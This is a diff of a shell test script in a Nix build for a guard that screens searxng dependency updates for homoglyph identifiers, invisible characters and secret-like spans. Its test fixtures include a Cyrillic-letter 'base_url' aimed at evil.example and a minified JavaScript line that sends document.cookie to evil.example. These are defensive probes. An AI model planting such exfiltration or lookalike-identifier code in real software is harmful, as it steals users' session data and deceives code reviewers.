+    sx_code braille-blank '\xe2\xa0\x80' U+2800
     sx_code hebrew-alef '\xd7\x90' U+05D0
     sx_code arabic-digit '\xd9\xa1' U+0661
     sx_code unassigned '\xf0\xaf\xa8\xa0' U+2FA20
@@ -859,18 +1131,42 @@ pkgs.runCommand "nixpkgs-bump-guard-test"
     rm -rf "$sd"
     mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines"
     echo 'x=1' >"$sd/a/searx/engines/q.py"
-    printf '# caf\xc3\xa9 \xe2\x80\x99 \xe2\x9c\x93 \xc3\x97 \xe5\x90\x89 e\xcc\x81\nb\xd0\xb0se_url = 1\n' >"$sd/b/searx/engines/q.py"
+    printf '# caf\xc3\xa9 \xe2\x80\x99 \xe2\x9c\x93 \xc3\x97 \xe5\x90\x89 e\xcc\x81\nlog("wait\xe2\x80\xa6 \xe2\x80\xa4")\nx = "\xd0\xb0"  # \xd0\xbf\xd1\x80\xd0\xb8 ok\xe5\x90\x89\n' >"$sd/b/searx/engines/q.py"
     nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || { cat "$sd/res"; echo "FAILED: visible non-ASCII in code held back"; exit 1; }
     # shellcheck disable=SC2016
     w1=$(printf '+# caf\xc3\xa9%s \xe2\x80\x99%s \xe2\x9c\x93%s \xc3\x97%s \xe5\x90\x89%s e\xcc\x81%s' '\u{00E9}' '\u{2019}' '\u{2713}' '\u{00D7}' '\u{5409}' '\u{0301}')
-    w2=$(printf '+b\xd0\xb0%sse_url = 1' '\u{0430}')
-    grep -qF -- "$w1" "$sd/out".part-01 && grep -qF -- "$w2" "$sd/out".part-01 || {
+    w2=$(printf '+log("wait\xe2\x80\xa6%s \xe2\x80\xa4%s")' '\u{2026}' '\u{2024}')
+    w3=$(printf '+x = "\xd0\xb0%s"' '\u{0430}')
+    grep -qF -- "$w1" "$sd/out".part-01 && grep -qF -- "$w2" "$sd/out".part-01 && grep -qF -- "$w3" "$sd/out".part-01 || {
       cat "$sd/out".part-01
       echo "FAILED: visible non-ASCII in code not spelled out"
       exit 1
     }
     parts_ok "$sd/out"
-    echo "ok: visible non-ASCII in code passes, spelled out as \\u{XXXX} after each"
+    echo "ok: visible non-ASCII in code passes, spelled out as \\u{XXXX} after each (U+2026, U+2024: NFKC-changed, no identifier)"
+    # (3) a word mixing scripts in code holds (a Cyrillic a in a Latin
+    # name), Latin with Han does not (above: ok\u{5409})
+    rm -rf "$sd"
+    mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines"
+    echo 'x=1' >"$sd/a/searx/engines/q.py"
+    printf 'b\xd0\xb0se_url = "https://evil.example/"\n' >"$sd/b/searx/engines/q.py"
+    rc=0
+    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
+    [ "$rc" = 3 ] && grep -q "^HOLD the code diff's line [0-9]*: a word mixing scripts (Cyrillic, Latin)" "$sd/res" || {
+      cat "$sd/res"; echo "FAILED: a mixed-script identifier in code not held (exit $rc)"; exit 1
+    }
+    grep -qF -- "$(printf '+b\xd0\xb0%sse_url' '\u{0430}')" "$sd/out".part-01 || { echo "FAILED: the mixed-script word not spelled out"; exit 1; }
+    # .md/.rst in the code diff: data rules (an emoji's U+FE0F shown, not
+    # held); the same in a .py holds
+    printf '# \xe2\x9a\xa0\xef\xb8\x8f note\n' >"$sd/b/PULL_REQUEST_TEMPLATE.md"
+    printf 'x = 1\n' >"$sd/b/searx/engines/q.py"
+    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || { cat "$sd/res"; echo "FAILED: U+FE0F in a .md held back"; exit 1; }
+    grep -qF -- "$(printf '+# \xe2\x9a\xa0%s note' '\u{FE0F}')" "$sd/out".part-01 || { cat "$sd/out".part-01; echo "FAILED: U+FE0F in a .md not shown"; exit 1; }
+    printf 'x = "\xe2\x9a\xa0\xef\xb8\x8f"\n' >"$sd/b/searx/engines/q.py"
+    rc=0
+    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
+    [ "$rc" = 3 ] && grep -q "^HOLD the code diff's line [0-9]*: a non-ASCII character U+FE0F" "$sd/res" || { cat "$sd/res"; echo "FAILED: U+FE0F in a .py not held"; exit 1; }
+    echo "ok: mixed-script words in code held; .md/.rst with data rules"
 
     # searx/data and translations: non-ASCII passes, the invisible ones
     # (default-ignorable from Unicode's table, format, separators) shown
@@ -880,9 +1176,9 @@ pkgs.runCommand "nixpkgs-bump-guard-test"
     echo 'x=1' >"$sd/a/searx/engines/q.py"
     echo 'x=1' >"$sd/b/searx/engines/q.py"
     printf '{"fa": "\xd9\x85\xdb\x8c\xe2\x80\x8c\xd8\xae", "t": "a\xf3\xa0\x81\x81\xf3\xa0\x81\xbfb", "s": "c\xc2\xadd\xcd\x8fe\xe3\x85\xa4f\xe1\x85\xa0g\xe2\x81\xa1h\xef\xb8\x80i\xe2\x80\x8bj\xc2\x85k"}\n' >"$sd/b/searx/data/n.json"
-    printf 'msgstr "\xe2\x81\xa4x\xe1\xa0\x8e"\n' >"$sd/b/searx/translations/fa/messages.po"
+    printf 'msgstr "\xe2\x81\xa4x\xe1\xa0\x8e\xe2\xa0\x80y\xef\xbe\xa0"\n' >"$sd/b/searx/translations/fa/messages.po"
     nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || { cat "$sd/res"; echo "FAILED: data/translation characters held back"; exit 1; }
-    for want in '\u{200C}' '"a\u{E0041}\u{E007F}b"' '"c\u{00AD}d\u{034F}e\u{3164}f\u{1160}g\u{2061}h\u{FE00}i\u{200B}j\u{0085}k"' '"\u{2064}x\u{180E}"'; do
+    for want in '\u{200C}' '"a\u{E0041}\u{E007F}b"' '"c\u{00AD}d\u{034F}e\u{3164}f\u{1160}g\u{2061}h\u{FE00}i\u{200B}j\u{0085}k"' '"\u{2064}x\u{180E}\u{2800}y\u{FFA0}"'; do
       grep -qF -- "$want" "$sd/out".part-01 || { cat "$sd/out".part-01; echo "FAILED: data: $want not shown"; exit 1; }
     done
     parts_ok "$sd/out"
@@ -918,29 +1214,50 @@ pkgs.runCommand "nixpkgs-bump-guard-test"
       echo "FAILED: the integrity lines are not masked and counted"
       exit 1
     }
-    sx_masked() { # name file content: not masked, held by the read check
+    # (2) any other line hermes' redactor would change in the uncounted
+    # diffs (and the searx/data summary) is written escaped, losslessly:
+    # the changed span as \xNN, every backslash of that line as \x5c;
+    # the read check then passes, the header counts them
+    sx_escaped() { # name file content
       rm -rf "$sd/b/client"
       mkdir -p "$(dirname "$sd/b/$2")"
       printf '%s\n' "$3" >"$sd/b/$2"
-      rc=0
-      nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
-      [ "$rc" = 3 ] && grep -q '^HOLD the review part out.part-01: line [0-9]*: read_file shows it with' "$sd/res" &&
-        grep -qxF '# package-lock.json integrity lines masked (npm hashes, nothing else): 0' "$sd/out" || {
+      nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || {
         cat "$sd/res"
-        echo "FAILED: $1: masked or not held (exit $rc)"
+        echo "FAILED: $1: held back, not escaped"
         exit 1
       }
+      grep -q "^# spans hermes' secret redactor would rewrite after the code diff, written escaped (.*): [1-9]" "$sd/out" || {
+        tail -n 3 "$sd/out"; echo "FAILED: $1: no escaped span counted"; exit 1
+      }
+      parts_ok "$sd/out"
+      # lossless: undo the escapes on the line, get the source line back
+      python3 - "$sd/out" "$3" <<'PY' || { echo "FAILED: $1: the escape is not lossless"; exit 1; }
+    import re, sys
+    want = sys.argv[2]
+    for line in open(sys.argv[1], encoding="utf-8"):
+        line = line.rstrip("\n")
+        if "\\x" not in line or not line.startswith("+"):
+            continue
+        back = re.sub(r"\\u\{([0-9A-F]{4,6})\}", lambda m: chr(int(m.group(1), 16)),
+                      re.sub(r"\\x([0-9a-f]{2})", lambda m: chr(int(m.group(1), 16)), line[1:]))
+        if back.strip() == want.strip():
+            sys.exit(0)
+    sys.exit(1)
+    PY
       rm -f "$sd/b/$2"
     }
-    # the reviewer's probes (rv8): code after the hash on the same line,
-    # in package-lock.json and in a minified asset (a 24 KB line)
-    sx_masked lock-trailing client/package-lock.json "  $integ, var x=1;fetch(\"//evil\")"
-    sx_masked lock-prefix client/package-lock.json "  x=1; $integ"
-    sx_masked lock-key client/package-lock.json "  \"integrity2\": \"sha512-$ihash\""
-    sx_masked lock-sha1 client/package-lock.json "  \"integrity\": \"sha1-$ihash\""
-    sx_masked min-js searx/static/app.min.js "!function(){$(printf 'var a=1;%.0s' {1..3000})fetch(\"https://evil.example/c?\"+document.cookie);var k=\"$ghp\";$integ}()"
-    sx_masked min-js-integ searx/static/app.min.js "  $integ"
-    sx_masked po searx/translations/de/messages.po "msgstr \"$integ\""
+    sx_escaped lock-trailing client/package-lock.json "  $integ, var x=1;fetch(\"//evil\")"
+    sx_escaped lock-prefix client/package-lock.json "  x=1; $integ"
+    sx_escaped lock-key client/package-lock.json "  \"integrity2\": \"sha512-$ihash\""
+    sx_escaped lock-sha1 client/package-lock.json "  \"integrity\": \"sha1-$ihash\""
+    sx_escaped min-js-integ searx/static/app.min.js "  $integ \\x41"
+    sx_escaped po searx/translations/de/messages.po "msgstr \"$integ\""
+    # (a URL with userinfo in searx/data holds: the summary's authority check)
+    sx_escaped data-token searx/data/e.json "{\"k\": \"$ghp\"}"
+    # a 24 KB minified line (folded into parts): escaped, the read check
+    # of every part passes
+    sx_escaped min-js searx/static/app.min.js "!function(){$(printf 'var a=1;%.0s' {1..3000})fetch(\"https://evil.example/c?\"+document.cookie);var k=\"$ghp\";$integ}()"
     # the same line in code still holds
     printf 'x = {%s}\n' "$integ" >"$sd/b/searx/engines/i.py"
     rc=0
@@ -956,5 +1273,67 @@ pkgs.runCommand "nixpkgs-bump-guard-test"
       exit 1
     fi
     echo "ok: a normal engine diff passes; only package-lock integrity lines masked (counted), the rv8 min.js probe and other lookalikes held"
+    # (4) the step-wise pick: the aged tip T3's diff holds (a mixed-script
+    # name in code at T3); the walk over master's first-parent commits
+    # T3 > T2 > T1 tries T2, which passes: PICKED old..T2, and a decision
+    # names T3 with the range; with T1 holding too and T2 as well the
+    # pick is HELD-BACK, refiled with the range
+    cd "$ws"
+    jj new main@origin >/dev/null 2>&1
+    t1=a111111111111111111111111111111111111111
+    t2=a222222222222222222222222222222222222222
+    t3=a333333333333333333333333333333333333333
+    rm -rf "$STUB/sxtree" && mkdir -p "$STUB/sxtree" /build/decisions
+    for r in $sxold $t1 $t2 $t3; do mkdir -p "$STUB/sxtree/$r/searx/engines"; echo 'x = 1' >"$STUB/sxtree/$r/searx/engines/e.py"; done
+    echo 'y = 1' >"$STUB/sxtree/$t1/searx/engines/f.py"
+    cp "$STUB/sxtree/$t1/searx/engines/f.py" "$STUB/sxtree/$t2/searx/engines/f.py"
+    echo 'z = 2' >"$STUB/sxtree/$t2/searx/engines/g.py"
+    cp "$STUB/sxtree/$t2/searx/engines/"{f,g}.py "$STUB/sxtree/$t3/searx/engines/"
+    printf 'b\xd0\xb0se_url = "https://evil.example/"\n' >"$STUB/sxtree/$t3/searx/engines/h.py"
+    echo $t3 >"$STUB/sxmaster"
+    tips $t3 $days4
+    echo identical >"$STUB/sxcompare/$t3...master"
+    for r in $t1 $t2 $t3; do echo ahead >"$STUB/sxcompare/$sxold...$r"; done
+    jq -n --arg o $sxold --arg a $t1 --arg b $t2 --arg c $t3 '{status: "ahead", commits: [
+      {sha: $a, parents: [{sha: $o}]}, {sha: "a999999999999999999999999999999999999999", parents: [{sha: $a}]},
+      {sha: $b, parents: [{sha: $a}, {sha: "a999999999999999999999999999999999999999"}]}, {sha: $c, parents: [{sha: $b}]}]}' \
+      >"$STUB/sxcompare/$sxold...$t3.json"
+    rc=0
+    nixpkgs-bump-searxng pick >"$TMPDIR/pick" 2>&1 || rc=$?
+    [ "$rc" = 0 ] && [ "$(tail -n 1 "$TMPDIR/pick")" = "nixpkgs-bump-searxng: PICKED ''${sxold:0:8}..''${t2:0:8} 14 lines" ] &&
+      [ "$(jq -r '.nodes.searxng.locked.rev' flake.lock)" = $t2 ] || {
+      cat "$TMPDIR/pick"; echo "FAILED: the step-wise pick did not take $t2 (exit $rc)"; exit 1
+    }
+    grep -qF "the first-parent commit before ''${t3:0:8}, which holds: the review cannot see all of the new tree: the code diff's line" "$TMPDIR/pick" &&
+      jq -e --arg g "''${t2:0:8}..''${t3:0:8}" 'select(.range == $g and (.why | contains("a word mixing scripts")))' /build/decisions/inbox.jsonl >/dev/null || {
+      cat "$TMPDIR/pick" /build/decisions/inbox.jsonl; echo "FAILED: the step-wise pick does not name the blocking commit"; exit 1
+    }
+    grep -qF "$t2" "$L.searxng-pick" || { echo "FAILED: the pick file is not for $t2"; exit 1; }
+    # a step whose prefetch fails is skipped, not fatal: T2 gone, T1 taken
+    mv "$STUB/sxtree/$t2" "$STUB/sxtree/$t2.off"
+    rc=0
+    nixpkgs-bump-searxng pick >"$TMPDIR/pick" 2>&1 || rc=$?
+    [ "$rc" = 0 ] && [ "$(tail -n 1 "$TMPDIR/pick")" = "nixpkgs-bump-searxng: PICKED ''${sxold:0:8}..''${t1:0:8} 7 lines" ] &&
+      grep -qF "prefetch of searxng ''${t2:0:8} failed: skipping that commit" "$TMPDIR/pick" || {
+      cat "$TMPDIR/pick"; echo "FAILED: a failed prefetch of a step was not skipped (exit $rc)"; exit 1
+    }
+    mv "$STUB/sxtree/$t2.off" "$STUB/sxtree/$t2"
+    # every step holds: HELD-BACK, pin back, the decision has the range
+    printf 'b\xd0\xb0se_url = 1\n' >"$STUB/sxtree/$t1/searx/engines/h.py"
+    cp "$STUB/sxtree/$t1/searx/engines/h.py" "$STUB/sxtree/$t2/searx/engines/h.py"
+    : >/build/decisions/inbox.jsonl
+    nixpkgs-bump-searxng pick >"$TMPDIR/pick" 2>&1 || rc=$?
+    [ "$(tail -n 1 "$TMPDIR/pick")" = "nixpkgs-bump-searxng: HELD-BACK" ] &&
+      [ "$(jq -r '.nodes.searxng.locked.rev' flake.lock)" = $sxold ] &&
+      jq -e --arg g "''${sxold:0:8}..''${t3:0:8}" 'select(.range == $g and (.why | contains("first-parent commits before it tried: none passes")))' \
+        /build/decisions/inbox.jsonl >/dev/null || {
+      cat "$TMPDIR/pick" /build/decisions/inbox.jsonl; echo "FAILED: a pick with no passing step not held back with its range"; exit 1
+    }
+    # the diff file the decision names is old..tip's, not the last step's
+    head -n 1 "$L.searxng-diff" | grep -qF "# searxng $sxold -> $t3:" &&
+      jq -e --arg d "''${sxold:0:8}..''${t3:0:8} is in" 'select(.why | contains($d))' /build/decisions/inbox.jsonl >/dev/null || {
+      head -n 1 "$L.searxng-diff"; echo "FAILED: a held-back night's diff file is not old..tip"; exit 1
+    }
+    echo "ok: the step-wise pick takes the newest first-parent commit that passes, names the blocking one; none passes: held, range in the decision"
     touch $out
   ''
